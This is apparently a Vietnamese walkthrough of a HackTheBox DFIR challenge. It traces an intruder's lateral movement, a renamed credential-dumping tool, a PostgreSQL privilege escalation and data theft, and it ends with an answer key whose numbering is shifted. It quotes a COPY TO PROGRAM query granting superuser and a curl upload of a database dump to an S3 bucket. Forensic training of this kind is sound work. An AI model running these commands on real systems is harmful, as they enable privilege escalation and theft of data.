![image](https://hackmd.io/_uploads/H1ifXinV1g.png)

After gaining elevated privileges on the victim machine, the Incident Response team has been assigned the task of analyzing whether the attacker has carried out any lateral movement or collected confidential data within the network, as unusual activity has been detected related to one of the cloud storage accounts.

# Salsa-Dance
## Sherlock info
Name |Brutus
|-|-|
Difficulty| Medium
Category | DFIR|

## Note from Scenario
- Thực hiện tấn công Lateral Movement 
- Hoạt động liên quan kết nối cloud 

## Tools use
- EvtxECmd.exe
- MFTECmd.exe
- AmcacheParser
- PECmd.exe
- Timeline Explorer

>### Comment
> Bài này kịch bản khá là rõ ràng và không biết thực tế có như này không

# Question 
1. What time (UTC) did the threat actor retrieve details about the domain controller using a native Windows tool?
2. To what directory on the compromised system did the threat actor download the tools used for reconnaissance?
3. Which legitimate Windows program did the threat actor use to download the initial file?
4. What is the MITRE ATT&CK Technique ID associated with the method used by the threat actor in Question \#3?
5. The threat actor used a program to identify the credentials stored on the victim machine. What was the original filename of this program before it was renamed?
6. What is the SHA1 hash of the file in Question \#5?
7. At what time (UTC) did the threat actor rename the program in Question \#5?
8. What is the name of the compromised account used by the threat actor to connect to the database server?
9. What is the source IP address used by the threat actor to connect to the database server?
10. What database command did the threat actor initially enter that resulted in an error?
11. What is the full command used by the threat actor to gain elevated access?
12. What tool was used by the threat actor to export the database?
13. What is the complete target URL used by the threat actor for exfiltration?
14. What public IP addresses were used by the threat actor for persistence? Sort smallest initial octet to largest.
15. At what time (UTC) did the victim's Windows machine connect to the Domain Controller?
16. After accessing the Domain Controller, how long did the threat actor’s session last (in seconds)?

# Analysis
Unzip ra ta nhận được tree bao gồm folder của Windows được dump từ KAPE và 1 folder từ CatScale

Câu hỏi liên quan đến ứng dụng và thời gian mà TA đã sử dụng. Đây là bước quan trọng nhất để xác định thời gian tấn công, lây nhiễm cũng như là để đoán attack chain của TA

Để xem các hoạt động mà ứng dụng đã được chạy trên Windows, chúng ta sẽ dùng `PECmd.exe` để phân tích Prefetch files.

## SWS255
### PECmd.exe
![image](https://hackmd.io/_uploads/SyD2O8HSke.png)

Dùng `Timeline Explorer` sẽ thấy một số chương trình đáng ngờ được thực thi theo thứ tự chỉ ra các hoạt động mà TA đã gọi ra như PowerShell, ipconfig và net.exe. Tuy nhiên câu hỏi liên quan đến hoạt động kiểm tra thông tin về AD hoặc Domain Controler đó chính là **NLTEST.exe**

![image](https://hackmd.io/_uploads/rJP0u8HHke.png)

Từ đây cũng cung cấp thời gian xuất hiện của nó là **2024-10-24 06\:27:29**

![image](https://hackmd.io/_uploads/BkxrcUBBJg.png)

### EvtxeCmd.exe
Ngoài ra còn 1 chương trình đáng ngờ đó là **bitsadmin.exe**, thường bị attacker khai thác để tải và upload các tệp đã được sử dụng. Do đó ta sẽ xem event log tại `Microsoft-Windows-Bits-Client/Operational` nơi log của chương trình này được ghi lại 

![image](https://hackmd.io/_uploads/r1d1itHSkx.png)

![image](https://hackmd.io/_uploads/BJPukPBHJx.png)

![image](https://hackmd.io/_uploads/B1bOUPHr1l.png)

Trong `Timeline Explorer` và tìm event liên quan đến ta có thể thấy `netscan_portable.zip` đã được tải xuống bằng BITS Jobs và được lưu tại **C:\Windows\INF**

![image](https://hackmd.io/_uploads/rJ1Z5tSByg.png)

Để trả lời cho câu hỏi tiếp theo thì ta chỉ cần dựa vào phần mềm bị lợi dụng và tìm ra được kỹ thuật **T1197** của MITRE

![image](https://hackmd.io/_uploads/SyhI5FBr1x.png)

### MFTECmd.exe
Câu hỏi tiếp theo liên quan đến việc có một chương trình đã được TA đổi tên, tức là modify. Việc được cung cấp thư mục `$J` sẽ hỗ trợ ta kiểm tra được việc này.

Trước tiên ta sẽ phải tìm nó là chương trình nào. Khi để ý ta sẽ thấy có 2 vấn đề mà đã được thu thập từ các câu hỏi trên:
- Thời gian sau khi chương trình **bitsadmin.exe** --> chương trình chắc chắn sẽ được chạy sau thời gian này
- File được tải và chạy sẽ nằm ở thư mục **C:\Windows\INF** 

![image](https://hackmd.io/_uploads/SJ-SCKBryx.png)

![image](https://hackmd.io/_uploads/BkbUCYBSyl.png)

`WinSysView.exe` đã được đổi thành tên mới của chương trình **CredentialsFileView.exe** lúc **2024-10-24 06\:35:24**

![image](https://hackmd.io/_uploads/B1pF0FHS1x.png)

### AmcacheParser.exe
Để trả lời cho câu hỏi hash của chương trình này ta sẽ lấy thông tin từ `Amcache.hve` file, nơi lưu trữ thông tin về các ứng dụng được thực thi trên hệ thống. Sử dụng `AmcacheParser.exe` để parse log 

![image](https://hackmd.io/_uploads/SJXGJ5SHkg.png)

Thông tin sẽ thấy chương trình có hash là **5463f4140efd005a7bafa6fa0fa759bcfcf7da4a**

![image](https://hackmd.io/_uploads/rJRXk9HSJe.png)

![image](https://hackmd.io/_uploads/Hk-vkcSHyg.png)

## CatScale 
Khoảng thời gian sau đó chương trình `SSH.EXE` của **OPENSSH** bắt đầu chạy. Ta sẽ tìm hiểu nó khi `CatScale` cho ra

![image](https://hackmd.io/_uploads/H1Y7haHryl.png)

### auth.log
Thông thường khi kết nối đến một db nào đấy, user sẽ phải thực hiện authen. Do đó ta sẽ tìm loại log này (có) ở `catscale_out\Logs\sdb00202410240743-varlog\var\log` là **sdb-aroy**

![image](https://hackmd.io/_uploads/Hk64ocHrJe.png)

Từ trên cũng thấy được IP của nó là **10.10.2.55**

### postgresql-12-main.log
Việc unzip folder `Logs\sdb00202410240743-varlog` cũng cho ta một folder chứa log của postgresql 

![image](https://hackmd.io/_uploads/Bk4DkTSrJg.png)

Ta sẽ thấy được lỗi trả về khi TA thực hiện query **SELECT * FROM accounts;**

![image](https://hackmd.io/_uploads/BJI516SSyg.png)

### history file in linux
Đối với câu hỏi leo quyền ở đâu thì ta xác định 2 vấn đề từ những câu tìm hiểu ở trên:
- User mà TA có foothold thì ta có thể kiểm tra ở `C:\Users\DELL\Downloads\HTB\SalsaDance\catscale_out\User_Files\home\sdb-aroy\.bash_history` để kiểm tra lịch sử các câu lệnh được sử dụng. Tuy nhiên cách này chỉ hiệu quả khi file này chưa bị xóa
- Vì user có đụng vào query ở PostgreSQL. Mà PostgreSQL có lỗ hổng về leo quyền nên ta cũng sẽ kiểm tra ở đây `C:\Users\DELL\Downloads\HTB\SalsaDance\catscale_out\User_Files\home\sdb-aroy\.psql_history`

![image](https://hackmd.io/_uploads/ryXsGTrHJg.png)

**COPY (SELECT '') TO PROGRAM 'psql -U postgres -c ''ALTER USER "sdb-aroy" WITH SUPERUSER;''';** chính là query mà TA dùng để leo quyền.

Cũng ở dưới, TA đã dùng **pg_dump** để dump db ra. Sau đó sử dụng curl để tiến hành gửi data của db ra ngoài 

```
curl -X PUT -T /tmp/atm.sql https://festival-of-files.s3.amazonaws.com/atm.sql
```

- `-X PUT`: Sử dụng `-X` để gửi ra ngoài
- `-T /tmp/atm.sql`: Sử dụng `-T` để chỉ định file upload tại `/tmp/atm.sql`
- **https://festival-of-files.s3.amazonaws.com/atm.sql** đây chính là link mà TA gửi ra ngoài

Như đã nói ở trên, sau khi tiến hành lấy được data và TA muốn quay trở lại, TA đã để persistent cho nó dump liên tục bằng cách cài thời gian ở  crontab. Việc này phải được config ở `.bashrc`. Xem lý do tại `.bash_history`

![image](https://hackmd.io/_uploads/H1_2BprHyx.png)

![image](https://hackmd.io/_uploads/HJnYHTHByl.png)

Đoạn này xong thì hơi bị lú vì TA nó còn để persistent ở Windows nữa. Mình thật thiên tài khi nhớ ra (Nhớ ra là còn đọc writeup : )))

![image](https://hackmd.io/_uploads/HJNNITrHyg.png)

![image](https://hackmd.io/_uploads/r1IBwaHBkl.png)

Từ câu hỏi này về sau là phải tham khảo write-up mới biết tiếp theo làm gì vì chưa tìm hiểu hết

### Windows-TerminalServices-RDPClient
Lý do được phỏng đoán không nghĩ tới là TA sẽ RDP chứ không phải cách khác. Tiếp theo sẽ là kiểm tra lại log của `MicrosoftWindows-TerminalServices-RDPClient/Operational` để xem được thời gian đầu tiên mà TA đã vào. Sau khi biết thời gian bị tấn công từ việc tìm hiểu ở trên, phòng trường hợp RDP không phải của TA

ta có thể thấy rằng kết nối được thiết lập vào khoảng **2024-10-24 07\:07:45** sau đó ngắt kết nối vào khoảng **07\:34:40 cùng ngày**. Tức là TA duy trì khoảng 26:05 phút ~ **1615 giây**

![image](https://hackmd.io/_uploads/SJuNYpHHJe.png)

# Answer
1. 2024-10-24 06\:27:29
2. C:\Windows\INF
3. bitsadmin.exe
4. T1197
5. CredentialsFileView.exe
7. \5463f4140efd005a7bafa6fa0fa759bcfcf7da4a
8. 2024-10-24 06\:35:24
9. sdb-aroy
10. 10.10.2.55
11. SELECT * FROM accounts;
12. COPY (SELECT '') TO PROGRAM 'psql -U postgres -c ''ALTER USER "sdb-aroy" WITH SUPERUSER;''';
13. pg_dump
14. https://festival-of-files.s3.amazonaws.com/atm.sql
15. 3.224.124.130, 34.234.202.16
16. 2024-10-24 07:07:45
17. 1615

------------------------------------------ Kết thúc Sherlock! ------------------------------------------

![image](https://hackmd.io/_uploads/ryQ69pHHyx.png)
